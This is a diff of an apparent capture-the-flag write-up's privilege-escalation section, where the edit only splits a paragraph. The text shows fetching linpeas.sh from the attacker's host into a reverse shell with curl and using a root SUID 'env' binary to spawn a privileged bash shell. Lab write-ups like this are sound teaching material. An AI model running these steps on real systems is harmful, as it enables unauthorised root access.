@@ -79,7 +79,9 @@ From there I grabbed `user.txt` in the home directory.
 Privilege Escalation
 --------------------
 
-To get `linpeas.sh` onto the box, I spun up a quick web server on my attacking host with `python3 -m http.server 8000` and fetched the script from the reverse shell using `curl http://[My_IP]:8000/linpeas.sh -o /tmp/linpeas.sh`. After marking it executable, I ran it to enumerate privilege escalation paths. The standout finding was an unusual SUID binary, `env`, owned by root. `GTFOBins` confirmed it could be abused to overwrite files as root:
+To get `linpeas.sh` onto the box, I spun up a quick web server on my attacking host with `python3 -m http.server 8000` and fetched the script from the reverse shell using `curl http://[My_IP]:8000/linpeas.sh -o /tmp/linpeas.sh`. After marking it executable, I ran it to enumerate privilege escalation paths.
+
+The standout finding was an unusual SUID binary, `env`, owned by root. `GTFOBins` confirmed it could be abused to overwrite files as root:
 
 ```
 /usr/bin/env /bin/bash -p
